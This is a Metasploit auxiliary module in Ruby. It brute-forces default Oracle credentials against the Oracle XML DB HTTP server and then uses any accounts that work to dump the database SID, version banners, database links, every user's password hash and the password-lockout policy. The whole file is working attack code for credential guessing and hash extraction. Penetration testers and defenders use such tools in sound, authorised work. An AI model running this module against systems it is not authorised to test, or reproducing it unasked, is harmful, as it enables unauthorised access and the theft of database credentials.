##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Report
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'        => 'Oracle XML DB SID Discovery via Brute Force',
			'Description' => %q{
					This module attempts to retrieve the sid from the Oracle XML DB httpd server,
					utilizing Pete Finnigan's default oracle password list.
			},
			'References'  =>
				[
					[ 'URL', 'http://dsecrg.com/files/pub/pdf/Different_ways_to_guess_Oracle_database_SID_(eng).pdf' ],
					[ 'URL', 'http://www.petefinnigan.com/default/oracle_default_passwords.csv'],
				],
			'Author'      => [ 'nebulus' ],
			'License'     => MSF_LICENSE
		)

		register_options(
				[
					OptString.new('CSVFILE', [ false, 'The file that contains a list of default accounts.', File.join(Msf::Config.install_root, 'data', 'wordlists', 'oracle_default_passwords.csv')]),
					Opt::RPORT(8080),
				], self.class)
		deregister_options('DBUSER','DBPASS')
	end

	def run_host(ip)
		begin

		res = send_request_raw({
			'uri'     => '/oradb/PUBLIC/GLOBAL_NAME',
			'version' => '1.0',
			'method'  => 'GET'
		}, 5)
		return if not res

		if(res.code == 200)
			vprint_status("http://#{ip}:#{datastore['RPORT']}/oradb/PUBLIC/GLOBAL_NAME (#{res.code}) is not password protected.")
			return
		elsif(res.code == 403 || res.code == 401)
			print_status("http://#{ip}:#{datastore['RPORT']}/oradb/PUBLIC/GLOBAL_NAME (#{res.code})")
		end

		list = datastore['CSVFILE']
		users = []

		fd = CSV.foreach(list) do |brute|

			datastore['DBUSER'] = brute[2].downcase
			datastore['DBPASS'] = brute[3].downcase
			user_pass = "#{datastore['DBUSER']}:#{datastore['DBPASS']}"

			res = send_request_raw({
				'uri'     => '/oradb/PUBLIC/GLOBAL_NAME',
				'version' => '1.0',
				'method'  => 'GET',
				'headers' =>
				{
					'Authorization' => "Basic #{Rex::Text.encode_base64(user_pass)}"
				}
			}, 10)

			if( not res )
				vprint_error("Unable to retrieve SID for #{ip}:#{datastore['RPORT']} with #{datastore['DBUSER']} / #{datastore['DBPASS']}...")
				next
			end
			if (res.code == 200)
				if (not res.body.length > 0)
				# sometimes weird bug where body doesn't have value yet
					res.body = res.bufq
				end
				sid = res.body.scan(/<GLOBAL_NAME>(\S+)<\/GLOBAL_NAME>/)[0]
				report_note(
					:host => ip,
					:proto	=> 'tcp',
					:port => datastore['RPORT'],
					:type => 'SERVICE_NAME',
					:data => sid,
					:update => :unique_data
				)
				print_good("Discovered SID: '#{sid[0]}' for host #{ip}:#{datastore['RPORT']} with #{datastore['DBUSER']} / #{datastore['DBPASS']}")
				users.push(user_pass)
			else
				vprint_error("Unable to retrieve SID for #{ip}:#{datastore['RPORT']} with #{datastore['DBUSER']} / #{datastore['DBPASS']}...")
			end
		end #fd.each

		good = false
		users.each do |user_pass|
			(u,p) = user_pass.split(':')

			# get versions
			res = send_request_raw({
				'uri'     => '/oradb/PUBLIC/PRODUCT_COMPONENT_VERSION',
				'version' => '1.1',
				'method'  => 'GET',
				'headers' =>
				{
					'Authorization' => "Basic #{Rex::Text.encode_base64(user_pass)}"
				}
			}, -1)

			if(res)
				if(res.code == 200)
					if (not res.body.length > 0)
					# sometimes weird bug where body doesn't have value yet
						res.body = res.bufq
					end

					doc = REXML::Document.new(res.body)

					print_good("Version Information ==> as #{u}")
					doc.elements.each('PRODUCT_COMPONENT_VERSION/ROW') do |e|
						p = e.elements['PRODUCT'].get_text
						v = e.elements['VERSION'].get_text
						s = e.elements['STATUS'].get_text
						report_note(
							:host => datastore['RHOST'],
							:sname => 'xdb',
							:proto => 'tcp',
							:port => datastore['RPORT'],
							:type => 'ORA_ENUM',
							:data => "Component Version: #{p}#{v}",
							:update => :unique_data
						)
						print_good("\t#{p}\t\t#{v}\t(#{s})")

					end
				end
			end

			# More version information
			res = send_request_raw({
				'uri'     => '/oradb/PUBLIC/ALL_REGISTRY_BANNERS',
				'version' => '1.1',
				'method'  => 'GET',
				'headers' =>
				{
					'Authorization' => "Basic #{Rex::Text.encode_base64(user_pass)}"
				}
			}, -1)

			if(res)
				if(res.code == 200)
					if (not res.body.length > 0)
					# sometimes weird bug where body doesn't have value yet
						res.body = res.bufq
					end

					doc = REXML::Document.new(res.body)

					doc.elements.each('ALL_REGISTRY_BANNERS/ROW') do |e|
						next if e.elements['BANNER'] == nil
						b = e.elements['BANNER'].get_text
						report_note(
							:host => datastore['RHOST'],
							:proto => 'tcp',
							:sname => 'xdb',
							:port => datastore['RPORT'],
							:type => 'ORA_ENUM',
							:data => "Component Version: #{b}",
							:update => :unique_data
						)
						print_good("\t#{b}")
					end
				end
			end

			#database links
			res = send_request_raw({
				'uri'     => '/oradb/PUBLIC/ALL_DB_LINKS',
				'version' => '1.1',
				'method'  => 'GET',
				'headers' =>
				{
					'Authorization' => "Basic #{Rex::Text.encode_base64(user_pass)}"
				}
			}, -1)

			if(res)
				if(res.code == 200)
					if (not res.body.length > 0)
					# sometimes weird bug where body doesn't have value yet
						res.body = res.bufq
					end

					doc = REXML::Document.new(res.body)

					print_good("Database Link Information ==> as #{u}")
					doc.elements.each('ALL_DB_LINKS/ROW') do |e|
						next if(e.elements['HOST'] == nil or e.elements['USERNAME'] == nil or e.elements['DB_LINK'] == nil)
						h = e.elements['HOST'].get_text
						d = e.elements['DB_LINK'].get_text
						us = e.elements['USERNAME'].get_text

						sid = h.to_s.scan(/\(SID\s\=\s(\S+)\)\)\)/)[0]
						if(h.to_s.match(/^\(DESCRIPTION/) )
							h = h.to_s.scan(/\(HOST\s\=\s(\S+)\)\(/)[0]
						end

						if(sid and sid != "")
							print_good("\tLink: #{d}\t#{us}\@#{h[0]}/#{sid[0]}")
							report_note(
								:host => h[0],
								:proto => 'tcp',
								:port => datastore['RPORT'],
								:sname => 'xdb',
								:type => 'oracle_sid',
								:data => sid,
								:update => :unique_data
							)
						else
							print_good("\tLink: #{d}\t#{us}\@#{h}")
						end
					end
				end
			end


			# get users
			res = send_request_raw({
				'uri'     => '/oradb/PUBLIC/DBA_USERS',
				'version' => '1.1',
				'method'  => 'GET',
				'read_max_data' => (1024*1024*10),
				'headers' =>
				{
					'Authorization' => "Basic #{Rex::Text.encode_base64(user_pass)}"
				}
			}, -1)

			if res and res.code == 200
				if (not res.body.length > 0)
				# sometimes weird bug where body doesn't have value yet
					res.body = res.bufq
				end

				doc = REXML::Document.new(res.body)
				print_good("Username/Hashes on #{ip}:#{datastore['RPORT']} ==> as #{u}")

				doc.elements.each('DBA_USERS/ROW') do |user|

					us = user.elements['USERNAME'].get_text
					h = user.elements['PASSWORD'].get_text
					as = user.elements['ACCOUNT_STATUS'].get_text
					print_good("\t#{us}:#{h}:#{as}")
					good = true
					if(as.to_s == "OPEN")
						report_note(
							:host => datastore['RHOST'],
							:proto => 'tcp',
							:sname => 'xdb',
							:port => datastore['RPORT'],
							:type => 'ORA_ENUM',
							:data => "Active Account #{u}:#{h}:#{as}",
							:update => :unique_data
						)
					else
						report_note(
							:host => datastore['RHOST'],
							:proto => 'tcp',
							:sname => 'xdb',
							:port => datastore['RPORT'],
							:type => 'ORA_ENUM',
							:data => "Disabled Account #{u}:#{h}:#{as}",
							:update => :unique_data
						)
					end
				end
			end

			# get password information
			res = send_request_raw({
				'uri'     => '/oradb/PUBLIC/USER_PASSWORD_LIMITS',
				'version' => '1.1',
				'method'  => 'GET',
				'read_max_data' => (1024*1024*10),
				'headers' =>
				{
					'Authorization' => "Basic #{Rex::Text.encode_base64(user_pass)}"
				}
			}, -1)

			if res and res.code == 200
				if (not res.body.length > 0)
				# sometimes weird bug where body doesn't have value yet
					res.body = res.bufq
				end

				doc = REXML::Document.new(res.body)

				print_good("Password Policy ==> as #{u}")
				fla=plit=pgt=prt=prm=plot=''
				doc.elements.each('USER_PASSWORD_LIMITS/ROW') do |e|
					next if e.elements['RESOURCE_NAME'] == nil

					case
						when(e.elements['RESOURCE_NAME'].get_text == 'FAILED_LOGIN_ATTEMPTS')
							fla = e.elements['LIMIT'].get_text
						when(e.elements['RESOURCE_NAME'].get_text == 'PASSWORD_LIFE_TIME')
							plit = e.elements['LIMIT'].get_text
						when(e.elements['RESOURCE_NAME'].get_text == 'PASSWORD_REUSE_TIME')
							prt = e.elements['LIMIT'].get_text
						when(e.elements['RESOURCE_NAME'].get_text == 'PASSWORD_REUSE_MAX')
							prm = e.elements['LIMIT'].get_text
						when(e.elements['RESOURCE_NAME'].get_text == 'PASSWORD_LOCK_TIME')
							plot = e.elements['LIMIT'].get_text
						when(e.elements['RESOURCE_NAME'].get_text == 'PASSWORD_GRACE_TIME')
							pgt = e.elements['LIMIT'].get_text
					end
				end

				print_good(
					"\tFailed Login Attempts: #{fla}\n\t" +
					"Password Life Time: #{plit}\n\t" +
					"Password Reuse Time: #{prt}\n\t" +
					"Password Reuse Max: #{prm}\n\t" +
					"Password Lock Time: #{plot}\n\t" +
					"Password Grace Time: #{pgt}"
				)
				report_note(
					:host => datastore['RHOST'],
					:proto => 'tcp',
					:sname => 'xdb',
					:port => datastore['RPORT'],
					:type => 'ORA_ENUM',
					:data => "Password Maximum Reuse Time: #{prm}",
					:update => :unique_data
				)
				report_note(
					:host => datastore['RHOST'],
					:proto => 'tcp',
					:sname => 'xdb',
					:port => datastore['RPORT'],
					:type => 'ORA_ENUM',
					:data => "Password Reuse Time: #{prt}",
					:update => :unique_data
				)
				report_note(
					:host => datastore['RHOST'],
					:proto => 'tcp',
					:sname => 'xdb',
					:port => datastore['RPORT'],
					:type => 'ORA_ENUM',
					:data => "Password Life Time: #{plit}",
					:update => :unique_data
				)
				report_note(
					:host => datastore['RHOST'],
					:proto => 'tcp',
					:sname => 'xdb',
					:port => datastore['RPORT'],
					:type => 'ORA_ENUM',
					:data => "Account Fail Logins Permitted: #{fla}",
					:update => :unique_data
				)
				report_note(
					:host => datastore['RHOST'],
					:proto => 'tcp',
					:sname => 'xdb',
					:port => datastore['RPORT'],
					:type => 'ORA_ENUM',
					:data => "Account Lockout Time: #{plot}",
					:update => :unique_data
				)
				report_note(
					:host => datastore['RHOST'],
					:proto => 'tcp',
					:sname => 'xdb',
					:port => datastore['RPORT'],
					:type => 'ORA_ENUM',
					:data => "Account Password Grace Time: #{pgt}",
					:update => :unique_data
				)
			end

			break if good
		end # users.each
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
		end
	end
end
